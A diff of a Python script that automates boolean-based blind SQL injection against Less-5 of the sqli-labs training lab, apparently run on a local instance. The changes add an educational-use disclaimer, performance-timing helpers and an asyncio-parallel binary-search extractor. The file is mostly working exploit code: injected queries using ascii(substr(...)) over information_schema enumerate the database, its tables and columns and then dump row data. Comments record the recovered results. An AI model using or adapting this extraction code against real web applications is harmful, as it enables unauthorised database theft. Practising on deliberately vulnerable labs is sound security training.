@@ -1,13 +1,47 @@
+""" 
+MIT License
+
+Copyright (c) 2024 [HackHuang]
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+ADDITIONAL DISCLAIMER:
+This software is intended for educational and security research purposes only.
+Users are solely responsible for ensuring compliance with all applicable laws
+and regulations. The author does not encourage or condone the use of this 
+software for malicious purposes.
+"""
+
+# Author: HackHuang
+# Description: For Less-5 of sqli-labs
+# Last Modified: 2024/12/14
+
 from urllib.parse import unquote
 from typing import *
+from contextlib import contextmanager
 
 import requests
 import re
 import time
-
-# Author: HackHuang
-# Description: For Less-5
-# Last Modified: 2024/12/07
+import tracemalloc
+import aiohttp
+import asyncio
 
 LAB_ROOT_URL: Final = 'http://localhost:8001'
 SQL_COMMENT: Final = '--+'
@@ -47,6 +81,41 @@ def url_decoder(url: str) -> str:
 def get_method(url: str, pattern: str) -> bool:
     reponse = requests.get(url=url)
     return True if re.search(pattern=pattern, string=reponse.text) else False
+
+async def get_method_async(url: str, pattern: str) -> bool:
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as response:
+            content = await response.text()
+            return pattern in content
+
+def print_func_performance(func: Callable) -> Callable:
+    def wrapper(*args: tuple, **kwargs: dict) -> None:
+        tracemalloc.start()
+        start_time: float = time.perf_counter()
+        func(*args, **kwargs)
+        current_memory: int
+        peak_memory: int
+        current_memory, peak_memory = tracemalloc.get_traced_memory()
+        finish_time: float = time.perf_counter()
+        print(f'Function: {func.__name__}')
+        print(f'Memory usage: \t\t{current_memory / 10**6:.6f} MB\n'
+              f'Peak memory usage:\t{peak_memory / 10**6:.6f} MB')
+        print(f'Time elapsed is seconds: {finish_time - start_time:.6f}')
+        print(f'{"-" * 40}')
+    return wrapper
+
+@contextmanager
+def print_code_snippet_performance(operation: str) -> Generator[None, None, None]:
+    tracemalloc.start()
+    start_time = time.perf_counter()
+    print(f'Starting {operation}')
+    yield
+    current_memory, peak_memory = tracemalloc.get_traced_memory()
+    end_time = time.perf_counter()
+    print(f'Memory usage:\t\t {current_memory / 10**6:.6f} MB \n'
+          f'Peak memory usage:\t {peak_memory / 10**6:.6f} MB')
+    print(f'Finished {operation} in {end_time - start_time:.6f} seconds\n')
+    tracemalloc.stop()
 
 @DeprecationWarning
 def init_char_list_by_ascii() -> None:
@@ -290,31 +359,45 @@ def binary_search(char_ascii_sorted_list: List[int], target_char_ascii: int) -> 
             right = mid - 1
     return -1
 
-# TODO
 def binary_search_test(sql_url_1:str, sql_url_2: str, pattern: str) -> int:
     # Note that the char_ascii_sorted_list must be a sorted arrary with ascending
-    left: int = 0
-    right: int = len(all_char_ascii_sorted_list) - 1
-    while left <= right:
-        time.sleep(1)
-        mid: int = (left + right) // 2
+    low: int = 0
+    high: int = len(all_char_ascii_sorted_list) - 1
+    while low <= high:
+        mid: int = (low + high) // 2
         char_ascii: int = all_char_ascii_sorted_list[mid]
         url_1: str = ''
         url_2: str = ''
-        url_1 = LAB_ROOT_URL + sql_url_1 + chr(char_ascii) + SQL_COMMENT
-        url_2 = LAB_ROOT_URL + sql_url_2 + chr(char_ascii) + SQL_COMMENT
+        url_1 = LAB_ROOT_URL + sql_url_1 + f'{char_ascii}' + SQL_COMMENT
+        url_2 = LAB_ROOT_URL + sql_url_2 + f'{char_ascii}' + SQL_COMMENT
         if get_method(url=url_1, pattern=pattern):
-            print(f'Get the char index successfully: {sql_url_1}')
+            print(f'Get the char index successfully: {url_1}\n')
             return mid
         elif get_method(url=url_2, pattern=pattern):
-            left = mid + 1
-            print(f'left = mid + 1, (left, mid, right): ({left, mid, right})')
+            # print(f'low = mid + 1, (low, mid, high): ({low, mid, high}), ({all_char_ascii_sorted_list[low], all_char_ascii_sorted_list[mid], all_char_ascii_sorted_list[high]})\n')
+            low = mid + 1
         else:
-            print(f'right = mid - 1, (left, mid, right): ({left, mid, right})')
-            right = mid - 1
+            # print(f'high = mid - 1, (low, mid, high): ({low, mid, high}), ({all_char_ascii_sorted_list[low], all_char_ascii_sorted_list[mid], all_char_ascii_sorted_list[high]})')
+            high = mid - 1
     return -1
 
-# TODO
+async def binary_search_test_async(sql_url_1: str, sql_url_2: str, pattern: str) -> int:
+    low: int = 0
+    high: int = len(all_char_ascii_sorted_list) - 1
+    while low <= high:
+        mid: int = (low + high) // 2
+        char_ascii: int = all_char_ascii_sorted_list[mid]
+        url_1: str = LAB_ROOT_URL + sql_url_1 + f'{char_ascii}' + SQL_COMMENT
+        url_2: str = LAB_ROOT_URL + sql_url_2 + f'{char_ascii}' + SQL_COMMENT
+        if await get_method_async(url=url_1, pattern=pattern):
+            print(f'Get the char index successfully: {url_1}\n')
+            return mid
+        elif await get_method_async(url=url_2, pattern=pattern):
+            low = mid + 1
+        else:
+            high = mid - 1
+    return -1
+
 def get_data_with_binary_search(table_column_data_len_dict: Dict[str, Dict[str, List[int]]], pattern: str) -> Dict[str, Dict[str, List[str]]]:
     table_column_data_dict: Dict[str, Dict[str, List[str]]] = {}
     for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
@@ -341,25 +424,64 @@ def get_data_with_binary_search(table_column_data_len_dict: Dict[str, Dict[str, 
         table_column_data_dict[table_name] = column_data_dict
     return table_column_data_dict
 
-# db_name_len: int = get_db_name_len(url="/Less-5/?id=1'and length(database())=")
+async def get_data_with_binary_search_async(table_column_data_len_dict: Dict[str, Dict[str, List[int]]], pattern: str) -> Dict[str, Dict[str, List[str]]]:
+    table_column_data_dict: Dict[str, Dict[str, List[str]]] = {}
+    for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
+        column_data_dict: Dict[str, List[str]] = {}
+        for column_name, data_len_list in column_and_data_len_dict.items():
+            data_str_list: List[str] = []
+            limit_begin_index: int = 0
+            for data_len in data_len_list:
+                data_str: str = ''
+                substr_begin_index: int = 1
+                tasks = []
+                count = 0
+                while count < data_len:
+                    url_str_1: str = f"/Less-5/?id=1' and ascii(substr((select {column_name} from {table_name} limit {limit_begin_index},1), {substr_begin_index},1)) ="
+                    url_str_2: str = f"/Less-5/?id=1' and ascii(substr((select {column_name} from {table_name} limit {limit_begin_index},1), {substr_begin_index},1)) >"
+                    tasks.append(binary_search_test_async(url_str_1, url_str_2, pattern))
+                    substr_begin_index = substr_begin_index + 1
+                    count = count + 1
+                result = await asyncio.gather(*tasks)
+                for r in result:
+                    if r == -1:
+                        print(f'Not found the index of data char')
+                    else:
+                        data_char_ascii = all_char_ascii_sorted_list[r]
+                        data_str = data_str + chr(data_char_ascii)
+                data_str_list.append(data_str)
+                print(f'------> data_str_list: {data_str_list}')
+                limit_begin_index = limit_begin_index + 1
+            column_data_dict[column_name] = data_str_list
+        table_column_data_dict[table_name] = column_data_dict
+    return table_column_data_dict
+
+# The db name length: 8
+# db_name_len: int = get_db_name_len(url="/Less-5/?id=1'and length(database())=", pattern='You are in')
 # print(f'The db name length: {db_name_len}')
 
+# The db name: security
 # db_name: str = get_db_name(url="/Less-5/?id=1' and ", pattern=r'You are in', db_name_len=8)
 # print(f'The db name: {db_name}')
 
+# The table number: 4
 # table_num: int = get_table_num(url="/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) -LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = ")
 # print(f'The table number: {table_num}')
 
+# The table name length: [6, 8, 7, 5]
 # table_name_len_list: List = get_table_name_len(table_num=4)
 # print(f'The table name length: {table_name_len_list}')
 
+# The table name list: ['emails', 'referers', 'uagents', 'users']
 get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
 table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
 print(f'The table name list: {table_name_list}\n\n')
 
+# The column num dict: {'emails': 2, 'referers': 3, 'uagents': 4, 'users': 3}
 column_num_dict: Dict[str, int] = get_column_num(table_name_list=table_name_list, pattern='You are in')
 print(f'The column num dict: {column_num_dict}\n\n')
 
+# The column name len dict: {'emails': {2: [2, 8]}, 'referers': {3: [2, 7, 10]}, 'uagents': {4: [2, 6, 10, 8]}, 'users': {3: [2, 8, 8]}}
 table_and_column_info_dict: Dict[str, Dict[int, List[int]]] = get_table_and_column_info(column_num_dict=column_num_dict, pattern='You are in')
 print(f'The column name len dict: {table_and_column_info_dict}\n\n')
 
@@ -468,21 +590,33 @@ print('\n\n')
 #                 data: admin3
 #                 data: dumbo
 #                 data: admin4
-table_column_data_dict: Dict[str, Dict[str, List[str]]] = get_data(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
-for table_name, column_and_data_dict in table_column_data_dict.items():
-    print(f'table name: {table_name}')
-    for column_name, data_list in column_and_data_dict.items():
-        print(f'\tcolumn name: {column_name}')
-        for data in data_list:
-            print(f'\t\tdata: {data}')
-print('\n\n')
 
-# TODO
-table_column_data_dict_2: Dict[str, Dict[str, List[str]]] = get_data_with_binary_search(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
-for table_name, column_and_data_dict in table_column_data_dict_2.items():
-    print(f'table name: {table_name}')
-    for column_name, data_list in column_and_data_dict.items():
-        print(f'\tcolumn name: {column_name}')
-        for data in data_list:
-            print(f'\t\tdata: {data}')
-print('\n\n')
+# Memory usage:            0.073696 MB 
+# Peak memory usage:       0.136580 MB
+# Finished get data in 70.489254 seconds
+with print_code_snippet_performance('get data'):
+    table_column_data_dict: Dict[str, Dict[str, List[str]]] = get_data(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
+    for table_name, column_and_data_dict in table_column_data_dict.items():
+        print(f'table name: {table_name}')
+        for column_name, data_list in column_and_data_dict.items():
+            print(f'\tcolumn name: {column_name}')
+            for data in data_list:
+                print(f'\t\tdata: {data}')
+    print('\n\n')
+
+# Memory usage:            0.074125 MB 
+# Peak memory usage:       0.137239 MB
+# Finished get data with binary search in 12.997436 seconds
+with print_code_snippet_performance('get data with binary search'):
+    table_column_data_dict_2: Dict[str, Dict[str, List[str]]] = get_data_with_binary_search(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
+    print(table_column_data_dict_2)
+
+async def main():
+    table_column_data_dict_3 = await get_data_with_binary_search_async(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
+    print(table_column_data_dict_3)
+
+# Memory usage:            0.283843 MB 
+# Peak memory usage:       0.987941 MB
+# Finished get data with binary search and asyncio in 2.776082 seconds
+with print_code_snippet_performance('get data with binary search and asyncio'):
+    asyncio.run(main())
